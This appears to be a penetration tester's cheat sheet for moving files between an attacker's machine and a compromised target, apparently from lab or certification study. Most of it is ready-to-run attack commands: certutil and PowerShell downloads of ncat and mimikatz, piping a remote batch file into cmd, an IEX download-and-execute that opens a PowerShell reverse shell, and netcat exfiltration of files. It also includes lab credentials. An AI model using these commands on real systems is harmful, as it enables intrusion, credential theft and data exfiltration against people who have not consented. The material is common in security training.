

# C2

##### HTTP GET
```python
python -m SimpleHTTPServer $port
```

```python
python3 -m http.server $port
```

##### HTTP PUT
```python
python3 -m uploadserver --basic-auth-upload offsec:wandton 8123
```

##### FTP
```
sudo systemctl start pure-ftpd
```
(Setup FTP Server on Linux: [isetup-ftp.sh](file:////home/kali/Documents/linuxAdministration/))

##### WebDAV
```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/ATP23/webdav/
```

##### TFTP (Useful on XP)
```bash
sudo atftpd --daemon --port 69 /tftp` )
```


# On the target

##### HTTP
```powershell
certutil.exe -urlcache -split -f "http://192.168.45.182:8000/ncat.exe"
```

```bash
curl -X POST http://$tip:8000/upload -F 'files=@$filename' -u offsec:wandton
```

```bash
curl http://server/file.bat | cmd
```
##### SSH
Upload
```bash
scp -i id_rsa_kali $file kali@$hip:"/home/kali/"
```
Download
```bash
scp $user@$hip:'C:\\Users\\$user\\Downloads\\data.zip' .
```

##### FTP
```powershell
echo "open 192.168.45.182 21" > ftp.txt; echo "USER offsec" >> ftp.txt; echo "alexrudolf" >> ftp.txt; echo "bin" >> ftp.txt; echo "GET ncat.exe" >> ftp.txt; echo "bye" >> ftp.txt; ftp -v -n -s:ftp.txt
```
(dir on linux: `/ftphome/`)
> Error `I won't open a connection to xx.xx.xx.xx (only to xx.xx.xx.xx)` means that passive mode is required. The windows ftp client does not support passive mode

##### TFTP (Useful on XP)
```powershell
tftp -i $ip put <filename>
```


## Download to Windows

```powershell
iwr -uri http://$hip/adduser.exe -Outfile adduser.exe
```

Download File (HTTP)
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$hip/$filename$','C:\Users\offsec\Desktop\wget.exe')"
```

```powershell
Invoke-WebRequest -Uri 'http://192.168.45.177:80/mimikatz32.exe' -OutFile 'C:\Users\marcus\Desktop\mimi32.exe'
```

Download and Execute String  (HTTP)
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:$port/Invoke-PowershellTcp.ps1'); Invoke-PowershellTcp -Reverse -IPAddress $ip -Port $port"
```



## Windows -> Linux

Netcat
```
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```